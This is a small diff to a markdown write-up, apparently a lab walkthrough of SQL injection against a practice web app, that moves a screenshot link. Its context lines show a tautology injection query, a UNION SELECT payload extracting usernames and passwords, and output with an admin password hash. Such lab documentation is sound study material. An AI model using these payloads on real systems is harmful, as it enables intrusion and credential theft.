@@ -63,9 +63,8 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
 
 **Payload:** `999' UNION SELECT user, password FROM users -- `
 
-![inj3](./screenshot-p3.png)
-
 **Result:**
+![inj3](./screenshot-p3.png)
 ```
 ID: 999' UNION SELECT user, password FROM users --
 First name: admin      Surname: 5f4dcc3b5aa765d61d8327deb882cf99
